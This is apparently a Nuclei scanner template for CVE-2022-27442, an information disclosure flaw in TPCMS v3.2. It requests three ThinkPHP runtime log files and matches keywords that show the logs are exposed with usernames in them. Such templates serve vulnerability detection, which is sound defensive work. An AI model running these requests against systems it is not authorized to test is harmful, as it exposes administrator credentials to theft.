id: CVE-2022-27442
info:
  name: CVE-2022-27442
  author: osamahamad
  severity: medium
  description: TPCMS v3.2 allows attackers to access the ThinkPHP log directory and obtain sensitive information such as the administrator's user name and password.
  tags: thinkphp
  reference:
    - https://gitee.com/happy_source/tpcms/issues/I3YNWY

requests:
  - method: GET
    path:
      - '{{BaseURL}}/Data/Runtime/Logs/Admin/21_07_01.log'
      - '{{BaseURL}}/Data/Runtime/Logs/Home/21_07_01.log'
      - '{{BaseURL}}/Data/Runtime/Logs/Member/21_07_01.log'

    matchers:
      - type: word
        words:
          - 'app_init'
          - 'app_begin'
          - 'app_end'
          - 'username'
        condition: and
        part: body
